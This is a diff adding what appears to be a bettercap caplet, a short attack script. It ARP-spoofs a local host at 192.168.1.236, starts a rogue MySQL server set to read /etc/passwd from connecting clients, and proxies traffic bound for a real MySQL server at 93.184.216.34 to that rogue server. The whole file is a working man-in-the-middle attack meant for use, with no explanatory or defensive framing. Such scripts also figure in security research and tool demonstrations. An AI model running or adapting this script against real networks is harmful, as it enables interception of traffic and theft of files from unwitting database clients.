@@ -1,0 +1,21 @@
+# set the target for arp spoofing
+set arp.spoof.targets 192.168.1.236
+
+# bind rogue mysql server to localhost and
+# set the file we want to read
+set mysql.server.address 127.0.0.1
+set mysql.server.port 3306
+set mysql.server.infile /etc/passwd
+mysql.server on
+
+# set the ip from the mysql server we want to impersonate
+set tcp.address 93.184.216.34
+set tcp.port 3306
+
+# set the ip from the rogue mysql server
+set tcp.tunnel.address 127.0.0.1
+set tcp.tunnel.port 3306
+
+# go ^_^
+tcp.proxy on
+arp.spoof on
